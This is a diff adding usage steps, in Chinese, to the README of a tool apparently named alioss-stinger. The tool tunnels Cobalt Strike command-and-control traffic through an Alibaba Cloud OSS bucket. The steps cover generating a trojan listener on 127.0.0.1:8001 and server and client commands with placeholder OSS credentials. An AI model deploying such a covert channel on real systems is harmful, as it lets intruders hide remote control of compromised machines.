@@ -28,3 +28,28 @@ Usage of C:\Users\xxx\AppData\Local\Temp\go-build3967568892\b001\exe\main.exe:
   -osskey string
         format: endpoint:accessKeyId:accessKeySecret:bucketName
 ```
+
+### CS
+
+生成监听本地127.0.0.1:8001的木马：
+
+![image-20221214185423368](README.assets/image-20221214185423368.png)
+
+### 服务端运行
+
+```
+.\alioss-stinger.exe -address 127.0.0.1:8001 -mode server -osskey endpoint:accessKeyId:accessKeySecret:bucketName
+```
+
+### 客户端运行
+
+```
+.\alioss-stinger.exe -address 127.0.0.1:8001 -mode client -osskey endpoint:accessKeyId:accessKeySecret:bucketName
+```
+
+![image-20221214185022534](README.assets/image-20221214185022534.png)
+
+# 阿里云安全配置
+
+待完善……
+
